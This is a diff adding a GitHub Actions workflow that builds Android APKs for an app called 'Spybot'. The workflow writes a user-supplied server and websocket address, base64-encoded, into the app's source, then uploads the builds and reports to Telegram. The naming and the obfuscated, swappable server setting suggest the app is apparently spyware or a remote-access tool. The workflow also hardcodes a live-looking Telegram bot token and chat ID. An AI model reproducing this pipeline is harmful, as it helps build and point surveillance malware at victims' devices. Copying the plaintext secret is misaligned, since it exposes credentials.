@@ -1,0 +1,113 @@
+name: Build Android APK
+
+on:
+  workflow_dispatch:
+    inputs:
+      build_type:
+        description: 'APK build type'
+        required: true
+        default: 'release'
+        type: choice
+        options: ['debug', 'release', 'both']
+
+      custom_base_url:
+        description: 'Custom server URL (leave empty to use Render server)'
+        required: false
+        default: ''
+        type: string
+
+  push:
+    branches: [main]
+    paths: ['app/**']
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+
+      # ──────────────────────────────────────────────────
+      # DETECT VERSION
+      # ──────────────────────────────────────────────────
+      - name: Detect version
+        id: version
+        run: |
+          GRADLE_FILE=$(find ./app -path "*/app/build.gradle*" -not -path "*/.gradle/*" -not -path "*/build/*" -type f | head -n1)
+          VERSION=$(grep "versionName" "$GRADLE_FILE" | sed 's/.*versionName[ =]*"\{0,1\}//;s/".*//')
+          [ -z "$VERSION" ] && VERSION="1.0.0"
+          echo "version_name=$VERSION" >> $GITHUB_OUTPUT
+
+      # ──────────────────────────────────────────────────
+      # INJECT CUSTOM URL (if provided)
+      # Otherwise keeps the hardcoded Render server URL
+      # ──────────────────────────────────────────────────
+      - name: Inject custom server URL
+        if: ${{ github.event.inputs.custom_base_url != '' }}
+        run: |
+          BASE="${{ github.event.inputs.custom_base_url }}"
+          BASE="${BASE%/}"
+          SOCKET=$(echo "$BASE" | sed -E 's|^https|wss|;s|^http|ws|')
+          JSON="{\"host\":\"$BASE/\",\"socket\":\"$SOCKET/\"}"
+          DATA=$(echo -n "$JSON" | base64 -w0)
+          FILE="./app/app/src/main/java/com/spybot/app/Utils/AppTools.kt"
+          sed -i "s|private const val DEFAULT_DATA = \".*\"|private const val DEFAULT_DATA = \"$DATA\"|" "$FILE"
+          echo "Injected URL: $BASE/"
+
+      # ──────────────────────────────────────────────────
+      # BUILD
+      # ──────────────────────────────────────────────────
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: 17
+          cache: gradle
+
+      - name: Build APK
+        working-directory: ./app
+        env:
+          BUILD_TYPE: ${{ github.event.inputs.build_type || 'release' }}
+        run: |
+          chmod +x gradlew
+          case "$BUILD_TYPE" in
+            debug)   ./gradlew assembleDebug --no-daemon ;;
+            release) ./gradlew assembleRelease --no-daemon ;;
+            both)    ./gradlew assembleDebug assembleRelease --no-daemon ;;
+          esac
+
+      # ──────────────────────────────────────────────────
+      # COLLECT APK
+      # ──────────────────────────────────────────────────
+      - name: Collect APK
+        run: |
+          mkdir -p output
+          find ./app -name "*.apk" -type f | while read f; do
+            NAME=$(basename "$f" .apk)
+            cp "$f" "output/Spybot-v${{ steps.version.outputs.version_name }}-${NAME}.apk"
+          done
+          ls -lh output/
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: Spybot-v${{ steps.version.outputs.version_name }}-APK
+          path: output/*.apk
+          retention-days: 30
+
+      # ──────────────────────────────────────────────────
+      # NOTIFY TELEGRAM
+      # ──────────────────────────────────────────────────
+      - name: Notify Telegram
+        if: always()
+        run: |
+          BOT="8764095413:AAEHztWz7XDLOhoLucXTmrQEls_ZLE-mNBQ"
+          CHAT="6367574197"
+          if [ "${{ job.status }}" = "success" ]; then
+            MSG="APK Build Successful! Spybot v${{ steps.version.outputs.version_name }} - Download from GitHub Actions Artifacts"
+          else
+            MSG="APK Build Failed - Check GitHub Actions for details"
+          fi
+          curl -s "https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${MSG}"
